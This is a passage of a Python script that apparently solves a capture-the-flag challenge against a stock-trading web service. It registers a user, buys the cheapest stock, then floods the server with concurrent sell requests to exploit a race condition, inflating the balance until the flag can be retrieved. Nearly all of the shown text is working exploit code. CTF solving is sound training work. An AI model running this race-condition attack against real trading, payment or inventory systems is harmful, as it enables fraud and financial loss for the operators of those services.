    return r.text.strip()

def get_status(key):
    r = requests.post(f"{BASE_URL}/login", data={"key": key})
    return r.json()

def get_flag(key):
    r = requests.post(f"{BASE_URL}/flag", data={"key": key})
    return r.text.strip()

def oversell_race(key, stock, stock_count, batch_size=124, max_attempts=7, sleep_between=0.7):
    """
    Attempts multiple high-threaded oversell attacks, stopping when flag is retrieved.
    """
    for attempt in range(max_attempts):
        print(f"[Attempt {attempt+1}/{max_attempts}] Race-selling {stock_count} of {stock}; batch size {batch_size}.")
        def spam_sell():
            sell_stock(key, stock)
        with ThreadPoolExecutor(max_workers=batch_size) as pool:
            for _ in range(stock_count * 4):
                pool.submit(spam_sell)
        time.sleep(sleep_between)
        status = get_status(key)
        print(f"[!] Status after batch: {status}")
        if status.get("balance",0) >= 9001:
            print("[!] JACKPOT: Balance is {status['balance']}!")
            result = get_flag(key)
            print("[FLAG] Flag is:\n", result)
            with open("/home/ctfplayer/ctf_files/src/stonk_raceflag.out","a") as f:
                f.write(f"FLAG: {result}\n\n")
            return True
    print("[x] Oversell race attempts failed.")
    return False

def main():
    key = gen_key()
    print(f"[*] Registering new user with key: {key}")
    start = register(key)
    print("[*] Starting wallet:", start)
    stocks = list_stocks()
    cheapest_id, cheapest = min(stocks.items(), key=lambda x:x[1]["price"])
    price = cheapest["price"]
    max_shares = int(start["balance"] // price)
    print(f"[*] Buying {max_shares} of {cheapest_id}")
    for _ in range(max_shares):
        buy_stock(key, cheapest_id)
        time.sleep(0.025)
    # Aggressive oversell races and flag grabbing
    success = oversell_race(key, cheapest_id, max_shares, batch_size=144, max_attempts=12, sleep_between=1.0)
    final = get_status(key)
